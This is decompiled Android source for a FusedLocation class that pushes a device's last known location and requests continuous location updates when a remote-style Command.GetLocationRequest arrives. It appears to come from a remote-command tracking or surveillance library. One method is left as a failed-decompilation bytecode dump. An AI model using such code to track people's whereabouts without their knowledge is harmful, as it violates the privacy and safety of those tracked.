package com.hawkshaw.library.features.location;

import E0.C0012c;
import E0.C0013d;
import G0.a;
import G0.c;
import K0.i;
import W2.e;
import W2.l;
import Y1.K;
import android.content.Context;
import androidx.lifecycle.V;
import com.google.firebase.messaging.H;
import com.hawkshaw.library.datalayer.models.Command;
import com.hawkshaw.library.ktextensions.ManifestPermissionsKt;
import com.hawkshaw.library.logger.Logger;
import i.C0528x;
import j3.f;
import o.C0769d;
import r0.d;
import t0.C0965i;

public final class FusedLocation {
    public static final Companion Companion = new Companion((f) null);
    private static final String TAG = "FusedLocation";
    /* access modifiers changed from: private */
    public final Context context;
    private final e fusedClient$delegate = new l(new V(this, 7));
    private final FusedLocation$locationCallback$1 locationCallback = new FusedLocation$locationCallback$1(this);
    /* access modifiers changed from: private */
    public final i3.l onLocationReceived;

    public static final class Companion {
        private Companion() {
        }

        public /* synthetic */ Companion(f fVar) {
            this();
        }
    }

    public FusedLocation(Context context2, i3.l lVar) {
        K.n(context2, "context");
        K.n(lVar, "onLocationReceived");
        this.context = context2;
        this.onLocationReceived = lVar;
    }

    private final a getFusedClient() {
        return (a) this.fusedClient$delegate.getValue();
    }

    /* JADX WARNING: type inference failed for: r1v0, types: [t0.n, java.lang.Object] */
    private final void pushLastKnownLocation() {
        E0.f fVar = (E0.f) getFusedClient();
        fVar.getClass();
        ? obj = new Object();
        obj.f9199b = true;
        obj.f9201d = C0012c.f330E;
        obj.f9200c = 2414;
        fVar.c(0, obj.a()).j(new H(this, 3));
    }

    /* access modifiers changed from: private */
    public static final void pushLastKnownLocation$lambda$0(FusedLocation fusedLocation, i iVar) {
        K.n(fusedLocation, "this$0");
        K.n(iVar, "it");
        if (!iVar.i() || iVar.g() == null) {
            Logger logger = Logger.INSTANCE;
            Exception f5 = iVar.f();
            Logger.e$default(logger, TAG, C0528x.h("PushLastKnownLocation: ", f5 != null ? f5.getMessage() : null), iVar.f(), false, 8, (Object) null);
            return;
        }
        Logger logger2 = Logger.INSTANCE;
        Object g5 = iVar.g();
        Logger.d$default(logger2, TAG, "LastKnownLocationReceived: " + g5, false, 4, (Object) null);
        i3.l lVar = fusedLocation.onLocationReceived;
        Object g6 = iVar.g();
        K.m(g6, "getResult(...)");
        lVar.invoke(g6);
    }

    /* JADX WARNING: type inference failed for: r4v5, types: [o.e0, java.lang.Object] */
    /* JADX WARNING: type inference failed for: r3v6, types: [t0.D, java.lang.Object] */
    /* JADX WARNING: Removed duplicated region for block: B:23:0x008c  */
    /* JADX WARNING: Removed duplicated region for block: B:43:0x0195  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    private final void requestLocationUpdates(com.hawkshaw.library.datalayer.models.Command.GetLocationRequest r25) {
        /*
            r24 = this;
            com.google.android.gms.location.LocationRequest r15 = new com.google.android.gms.location.LocationRequest
            r0 = r15
            android.os.WorkSource r1 = new android.os.WorkSource
            r21 = r1
            r1.<init>()
            r20 = 0
            r22 = 0
            r1 = 102(0x66, float:1.43E-43)
            r2 = 3600000(0x36ee80, double:1.7786363E-317)
            r4 = 600000(0x927c0, double:2.964394E-318)
            r6 = 0
            r8 = 9223372036854775807(0x7fffffffffffffff, double:NaN)
            r10 = 9223372036854775807(0x7fffffffffffffff, double:NaN)
            r12 = 2147483647(0x7fffffff, float:NaN)
            r13 = 0
            r14 = 1
            r16 = 3600000(0x36ee80, double:1.7786363E-317)
            r23 = r15
            r15 = r16
            r17 = 0
            r18 = 0
            r19 = 0
            r0.<init>(r1, r2, r4, r6, r8, r10, r12, r13, r14, r15, r17, r18, r19, r20, r21, r22)
            long r0 = r25.getInterval()
            r2 = 0
            int r4 = (r0 > r2 ? 1 : (r0 == r2 ? 0 : -1))
            r5 = 0
            r6 = 1
            if (r4 < 0) goto L_0x0045
            r4 = r6
            goto L_0x0046
        L_0x0045:
            r4 = r5
        L_0x0046:
            java.lang.String r7 = "intervalMillis must be greater than or equal to 0"
            o.C0769d.I(r7, r4)
            r4 = r23
            long r7 = r4.f4533c
            long r9 = r4.f4532b
            r11 = 6
            long r13 = r9 / r11
            int r7 = (r7 > r13 ? 1 : (r7 == r13 ? 0 : -1))
            if (r7 != 0) goto L_0x005d
            long r7 = r0 / r11
            r4.f4533c = r7
        L_0x005d:
            long r7 = r4.f4539i
            int r7 = (r7 > r9 ? 1 : (r7 == r9 ? 0 : -1))
            if (r7 != 0) goto L_0x0065
            r4.f4539i = r0
        L_0x0065:
            r4.f4532b = r0
            int r0 = r25.getMPriority()
            r1 = 100
            if (r0 == r1) goto L_0x0080
            r1 = 102(0x66, float:1.43E-43)
            if (r0 == r1) goto L_0x0080
            r1 = 104(0x68, float:1.46E-43)
            if (r0 == r1) goto L_0x0080
            r1 = 105(0x69, float:1.47E-43)
            if (r0 != r1) goto L_0x007d
        L_0x007b:
            r7 = r6
            goto L_0x0082
        L_0x007d:
            r1 = r0
            r7 = r5
            goto L_0x0082
        L_0x0080:
            r1 = r0
            goto L_0x007b
        L_0x0082:
            java.lang.Integer r1 = java.lang.Integer.valueOf(r1)
            java.lang.Object[] r1 = new java.lang.Object[]{r1}
            if (r7 == 0) goto L_0x0195
            r4.f4531a = r0
            long r0 = r25.getFastestInterval()
            int r7 = (r0 > r2 ? 1 : (r0 == r2 ? 0 : -1))
            if (r7 < 0) goto L_0x0098
            r7 = r6
            goto L_0x0099
        L_0x0098:
            r7 = r5
        L_0x0099:
            java.lang.Long r8 = java.lang.Long.valueOf(r0)
            java.lang.Object[] r8 = new java.lang.Object[]{r8}
            if (r7 == 0) goto L_0x0187
            r4.f4533c = r0
            long r0 = r25.getExpirationDuration()
            int r2 = (r0 > r2 ? 1 : (r0 == r2 ? 0 : -1))
            if (r2 <= 0) goto L_0x00ae
            r5 = r6
        L_0x00ae:
            java.lang.String r2 = "durationMillis must be greater than 0"
            o.C0769d.I(r2, r5)
            r4.f4535e = r0
            float r0 = r25.getSmallestDisplacement()
            r1 = 0
            int r1 = (r0 > r1 ? 1 : (r0 == r1 ? 0 : -1))
            if (r1 < 0) goto L_0x0171
            r4.f4537g = r0
            G0.a r0 = r24.getFusedClient()
            r2 = r24
            com.hawkshaw.library.features.location.FusedLocation$locationCallback$1 r1 = r2.locationCallback
            android.os.Looper r3 = android.os.Looper.getMainLooper()
            E0.f r0 = (E0.f) r0
            r0.getClass()
            if (r3 != 0) goto L_0x00dc
            android.os.Looper r3 = android.os.Looper.myLooper()
            java.lang.String r5 = "invalid null looper"
            o.C0769d.O(r3, r5)
        L_0x00dc:
            java.lang.Class<G0.c> r5 = G0.c.class
            java.lang.String r5 = r5.getSimpleName()
            java.lang.String r7 = "Listener must not be null"
            o.C0769d.O(r1, r7)
            t0.k r7 = new t0.k
            r7.<init>(r3, r1, r5)
            E0.e r1 = new E0.e
            r1.<init>(r0, r7)
            u0.k r3 = new u0.k
            r5 = 3
            r3.<init>((int) r5, (java.lang.Object) r1, (java.lang.Object) r4)
            o.e0 r4 = new o.e0
            r4.<init>()
            t0.C r5 = t0.C.f9134D
            r4.f8024H = r5
            r4.f8021E = r6
            r4.f8022F = r3
            r4.f8023G = r1
            r4.f8025I = r7
            r1 = 2436(0x984, float:3.414E-42)
            r4.f8020D = r1
            t0.i r1 = r7.f9197c
            java.lang.String r3 = "Key must not be null"
            o.C0769d.O(r1, r3)
            t0.D r3 = new t0.D
            java.lang.Object r6 = r4.f8025I
            t0.k r6 = (t0.C0967k) r6
            java.lang.Object r7 = r4.f8026J
            r0.c[] r7 = (r0.C0921c[]) r7
            boolean r8 = r4.f8021E
            int r9 = r4.f8020D
            r3.<init>()
            r3.f9139e = r4
            r3.f9137c = r6
            r3.f9138d = r7
            r3.f9136b = r8
            r3.f9135a = r9
            io.sentry.O0 r7 = new io.sentry.O0
            r7.<init>((o.e0) r4, (t0.C0965i) r1)
            t0.i r1 = r6.f9197c
            java.lang.String r4 = "Listener has already been released."
            o.C0769d.O(r1, r4)
            java.lang.Object r1 = r7.f6485E
            t0.i r1 = (t0.C0965i) r1
            o.C0769d.O(r1, r4)
            t0.e r1 = r0.f8981h
            r1.getClass()
            K0.j r4 = new K0.j
            r4.<init>()
            int r6 = r3.f9135a
            r1.e(r4, r6, r0)
            t0.H r6 = new t0.H
            t0.B r8 = new t0.B
            r8.<init>(r3, r7, r5)
            r6.<init>((t0.B) r8, (K0.j) r4)
            B0.g r3 = r1.f9191m
            t0.A r4 = new t0.A
            java.util.concurrent.atomic.AtomicInteger r1 = r1.f9187i
            int r1 = r1.get()
            r4.<init>(r6, r1, r0)
            r0 = 8
            android.os.Message r0 = r3.obtainMessage(r0, r4)
            r3.sendMessage(r0)
            return
        L_0x0171:
            r2 = r24
            java.lang.IllegalArgumentException r1 = new java.lang.IllegalArgumentException
            java.lang.StringBuilder r3 = new java.lang.StringBuilder
            java.lang.String r4 = "invalid displacement: "
            r3.<init>(r4)
            r3.append(r0)
            java.lang.String r0 = r3.toString()
            r1.<init>(r0)
            throw r1
        L_0x0187:
            r2 = r24
            java.lang.IllegalArgumentException r0 = new java.lang.IllegalArgumentException
            java.lang.String r1 = "illegal fastest interval: %d"
            java.lang.String r1 = java.lang.String.format(r1, r8)
            r0.<init>(r1)
            throw r0
        L_0x0195:
            r2 = r24
            java.lang.IllegalArgumentException r0 = new java.lang.IllegalArgumentException
            java.lang.String r3 = "priority %d must be a Priority.PRIORITY_* constant"
            java.lang.String r1 = java.lang.String.format(r3, r1)
            r0.<init>(r1)
            throw r0
        */
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.location.FusedLocation.requestLocationUpdates(com.hawkshaw.library.datalayer.models.Command$GetLocationRequest):void");
    }

    public final void checkAndRequestLocationUpdates(Command.GetLocationRequest getLocationRequest) {
        K.n(getLocationRequest, "lr");
        if (!ManifestPermissionsKt.hasPermission("android.permission.ACCESS_FINE_LOCATION", "android.permission.ACCESS_COARSE_LOCATION")) {
            Logger.log$default(Logger.INSTANCE, TAG, "You don't have location permission!", false, 4, (Object) null);
            return;
        }
        int b5 = d.f8864c.b(this.context, r0.e.f8865a);
        if (b5 == 1 || b5 == 2 || b5 == 3 || b5 == 9 || b5 == 18) {
            Logger.log$default(Logger.INSTANCE, TAG, C0528x.b("Not available, google services are not available, ", b5), false, 4, (Object) null);
            return;
        }
        pushLastKnownLocation();
        requestLocationUpdates(getLocationRequest);
    }

    public final void stopLocationUpdates() {
        Logger.d$default(Logger.INSTANCE, TAG, "Stopping location updates", false, 4, (Object) null);
        a fusedClient = getFusedClient();
        FusedLocation$locationCallback$1 fusedLocation$locationCallback$1 = this.locationCallback;
        E0.f fVar = (E0.f) fusedClient;
        fVar.getClass();
        String simpleName = c.class.getSimpleName();
        C0769d.O(fusedLocation$locationCallback$1, "Listener must not be null");
        C0769d.M("Listener type must not be empty", simpleName);
        fVar.b(new C0965i(fusedLocation$locationCallback$1, simpleName), 2418).k(C0013d.f331D, C0012c.f329D);
    }
}
